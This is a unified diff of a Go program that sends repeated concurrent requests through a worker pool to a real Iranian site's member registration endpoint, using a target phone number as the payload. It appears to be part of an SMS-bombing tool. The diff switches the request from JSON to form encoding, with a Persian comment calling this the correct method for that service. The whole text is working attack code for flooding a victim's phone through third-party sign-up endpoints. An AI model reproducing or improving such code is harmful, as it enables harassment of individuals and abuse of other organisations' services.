@@ -357,11 +357,11 @@ cookieJar, _ := cookiejar.New(nil)
         Timeout: 10 * time.Second,
 	}
 
-	tasks := make(chan func(), repeatCount*3)
+	tasks := make(chan func(), repeatCount*2)
 
 	var wg sync.WaitGroup
 
-	ch := make(chan int, repeatCount*3)
+	ch := make(chan int, repeatCount*2)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
@@ -373,35 +373,13 @@ cookieJar, _ := cookiejar.New(nil)
 
 	for i := 0; i < repeatCount; i++ {
 		
+// سرویس operator-100.ir (با روش صحیح Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				payload := map[string]interface{}{"email": phone}
-				sendJSONRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", payload, &wg, ch)
-			}
-		}(client)
-
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{"email": getPhoneNumberNoZero(phone)}
-				sendJSONRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", payload, &wg, ch)
-			}
-		}(client)
-
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{"email": getPhoneNumber98NoZero(phone)}
-				sendJSONRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", payload, &wg, ch)
-			}
-		}(client)
-
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{"email": getPhoneNumberPlus98NoZero(phone)}
-				sendJSONRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", payload, &wg, ch)
+				formData := url.Values{}
+				formData.Set("email", phone) // نام فیلد همان email است
+				sendFormRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", formData, &wg, ch)
 			}
 		}(client)
 
